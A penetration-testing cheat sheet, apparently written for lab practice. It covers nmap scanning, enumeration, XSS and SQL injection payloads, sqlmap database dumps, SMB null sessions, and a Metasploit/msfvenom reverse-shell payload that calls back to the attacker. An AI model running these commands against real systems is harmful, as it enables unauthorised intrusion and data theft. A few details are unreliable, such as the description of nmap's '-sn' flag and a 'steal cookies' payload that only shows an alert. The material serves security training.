# Cheat Sheet

This cheat sheet is a list of commands to help with the black box
pen test engagements. 

## RevShell Generator

https://www.revshells.com/

## Networking

Check routing table information

```
$ route
$ ip route
```

Add a network to current route

```
$ ip route add 192.168.10.0/24 via 10.175.3.1
$ route add -net 192.168.10.0 netmask 255.255.255.0 gw 10.175.3.1
$ netdiscover -r 172.16.64.0 -i int
```

DNS

```
$ nslookup mysite.com
$ dig mysite.com
```

SQLMAP

```
https://kk-shichao.medium.com/exploit-bwapp-using-sqlmap-15c422a1a899
```

## Subdomain Enumeration

- [Sublist3r](https://github.com/aboul3la/Sublist3r)
- [DNSdumpster](https://dnsdumpster.com/)
- ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://172.16.64.101/FUZZ

## Footprinting & Scanning

Find live hosts with fping or nmap
```
$ fping -a -g 172.16.100.40/24 2>/dev/null | tee alive_hosts.txt
$ nmap -sn 172.16.100.40/24 -oN alive_hosts.txt
$ nmap -sT -O 192.168.102.0/24 -> best network discover
```

nmap scan types
```
-sS: TCP SYN Scan (aka Stealth Scan)
-sT: TCP Connect Scan 
-sU: UDP Scan
-sn: Port Scan
-sV: Service Version information
-O: Operating System information
-A: Detect OS and services
-p: single port
-p x-xx: range ports
-F: 100 most common ports
-p-: all ports (65535)
```

### Spotting a Firewall

If an nmap TCP scan identified a well-known service, such as a web server, but
cannot detect the version, then there may be a firewall in place.

For example:
```
PORT    STATE  SERVICE  REASON          VERSION
80/tcp  open   http?    syn-ack ttl 64
```

Another example:
```
80/tcp  open   tcpwrapped 
```

**"tcpwrapped"** means the TCP handshake was completed, but the remote host
closed the connection without receiving any data. 

These are both indicators that a firewall is blocking our scan with the target!

Tips:
- Use "--reason" to see why a port is marked open or closed
- If a "RST" packet is received, then something prevented the connection - probably a firewall!

## Masscan
Masscan is designed to scan thousands of IP addresses at once.


## Vulnerability Assessment

Use the information from the Enumeration/Footprinting phases to find a vulnerable threat vector.

Below are some helpful Vulnerability assessment resources:
- Searchsploit
- ExploitDB
- Msfconsole search command
- Google
- Nessus


## Web Server Fingerprinting

Use netcat for HTTP banner grabbing:
```
$ nc <target addr> 80
HEAD / HTTP/1.0
```

Use OpenSSL for HTTPS banner grabbing:
```
$ openssl s_client -connect target.site:443
HEAD / HTTP/1.0
```

httprint is a web fingerprinting tool that uses **signature-based** technique
to identify web servers. This is more accurate since sysadmins can customize
web server banners.

```
$ httprint -P0 -h <target hosts> -s <signature file>
```

## Directory and File Enumeration

Pick your favorite URI Enumeration tool
- Gobuster - fast, multi-threaded scanner
- Dirbuster - nice GUI
- Dirb - recursively scans directories

## XSS

Look to exploit user input coming from:
- Request headers
- Cookies
- Form inputs
- POST parameters
- GET parameters

Check for XSS
```
<script>alert(1)</script>
<i>some text</i>
```

Steal cookies:
```
<script>alert(document.cookie)</script>
```

## SQL Injection

Same injection points as XSS. 

Boolean Injection:
- and 1=1; -- -
- or 'a'='a'; -- -

Once you determine that a site is vulnerable to SQLi, automate with SQL Map.

```
$ sqlmap -u <url>
$ sqlmap -u <url> -p <parameter>
$ sqlmap -u <url> --tables
$ sqlmap -u <url> -D <database name> -T <table name> --dump
```

## Windows Shares Enumeration

Check what shares are available on a host
```
$ smbclient -L //ip 
$ enum4linux -a ip_address
```

## SMB Null Attack
Try to login without a username or password:

```
$ smbclient //ip/share -N
```

## MySQL Database commands

Login to MySQL with password
```
$ mysql --user=root --port=13306 -p -h 172.16.64.81
```

```
> SHOW databases;
> SHOW tables FROM databases;
> USE database;
> SELECT * FROM table;
```

Change table entry values
```
# Add the user tracking1 to the "adm" group
> update users set adm="yes" where username="tracking1";
```

## Meterpreter reverse shell

1. Find vulnerability in target (e.g. LFI/RFI)
2. Set up a Metasploit listener
```
use exploit/multi/handler
set payload linux/x64/meterpreter_reverse_tcp # or any payload you wish
set lhost <MY IP>
set lport <PORT>  # set to a port open on the target to bypass firewall
run
```

3. Create a matching meterpreter-based executable using msfvenom
```
msfvenon -p linux/x64/meterpreter_reverse_tcp lhost=<MY IP> lport=<PORT> -f elf -o meter
```

4. Upload the payload to target (e.g LFI/RFI)

## Adding Virtual Hosts

In the black box practice labs, we had to add a virtual host to /etc/hosts in
order to connect to the webpage.

```
$ sudo vim /etc/hosts
<IP addr>	static.foobar.org
```

## Misc

- Found a webshell/admin panel on a site?
	- Run phpinfo(); to determine if it is a PHP shell
- Try to get a reverse shell connection
- Check for flag in the user's home directory
- Enumerate, enumerate, enumerate

## Python Shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
## Tomcat

https://charlesreid1.com/wiki/Metasploitable/Apache/Tomcat_and_Coyote
https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown

## JacktheRipper e Hashcat

```
https://www.cyberciti.biz/faq/unix-linux-password-cracking-john-the-ripper/
https://resources.infosecinstitute.com/topic/hashcat-tutorial-beginners/
```
